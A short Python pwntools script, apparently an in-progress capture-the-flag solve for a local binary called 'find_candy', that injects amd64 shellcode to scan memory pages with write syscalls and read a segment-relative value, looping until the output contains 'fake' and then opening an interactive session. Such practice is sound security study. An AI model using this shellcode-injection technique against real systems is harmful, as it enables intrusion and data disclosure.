from pwn import *
import random

context.arch = 'amd64'

# prob = (((x << 12) & 0x0000fffff000) | 0x080000000000)
addr = 0x80000000000
sc = shellcraft.write(1, addr, 0xfff)
for _ in range(80):
    sc += '''
    push 1
    pop rax
    add rsi, 0x1000
    syscall
    '''
    
sc = asm(sc)
print(len(sc))

sc = ''
sc += '''
mov rax, qword ptr cs:[0x28]
mov rax, qword ptr ds:[0x28]
'''
sc = asm(sc)

for _ in range(0x1000):
    p = process('./find_candy')

    pause()
    p.sendlineafter(b"shellcode: ", sc)

    data = p.recvall()
    # print(data)
    if b"fake" in data:
        print(data)
        p.interactive()
        break
    p.close()